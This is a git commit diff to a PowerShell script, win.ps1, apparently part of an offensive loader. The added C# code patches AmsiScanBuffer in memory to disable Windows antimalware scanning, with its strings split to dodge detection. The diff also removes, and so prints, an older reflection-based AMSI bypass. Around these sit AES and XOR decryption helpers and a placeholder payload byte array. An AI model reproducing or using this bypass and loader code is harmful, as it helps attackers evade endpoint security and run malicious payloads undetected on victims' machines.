99646aa245c6c01fbbdb4ff7a6dd8c023ea4d381
ReconDeveloper <86631513+ReconDeveloper@users.noreply.github.com>
2023-06-04 03:11:31 -0500

    Update win.ps1

--- win.ps1
+++ win.ps1
@@ -1,3 +1,34 @@
+$data = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+public class Program
+{
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
+    public static void Run()
+    {
+        IntPtr lib = LoadLibrary("a"+"m"+"si."+"dll");
+        IntPtr amsi = GetProcAddress(lib, "Am"+"s"+"iScan"+"B"+"uffer");
+        IntPtr final = IntPtr.Add(amsi, 0x95);
+        uint old = 0;
+        VirtualProtect(final, (UInt32)0x1, 0x40, out old);
+
+        Console.WriteLine(old);
+        byte[] patch = new byte[] { 0x75 };
+
+        Marshal.Copy(patch, 0, final, 1);
+
+        VirtualProtect(final, (UInt32)0x1, old, out old);
+    }
+}
+"@
+
 function Create-AesManagedObject($key, $IV) {
     $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
     $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
@@ -60,11 +91,12 @@ function De-Xor {
 }
 
 
+Add-Type $data -Language CSharp 
+
+[Program]::Run()
 
 $key = Create-AesKey
-$key
-$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'si'+'Ut'+'ils');$y=$x.GetField('am'+'siC'+'on'+'te'+'xt',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x31323334)
-
+#$key
 
 #This is filler data, you will need to generate the byte array
 $xor_data = @(0x0C,0x1B,0xD1,0x41,0x42,0x41,0x41,0x41,0x45,0x41,0x41,0x41,0xBE)
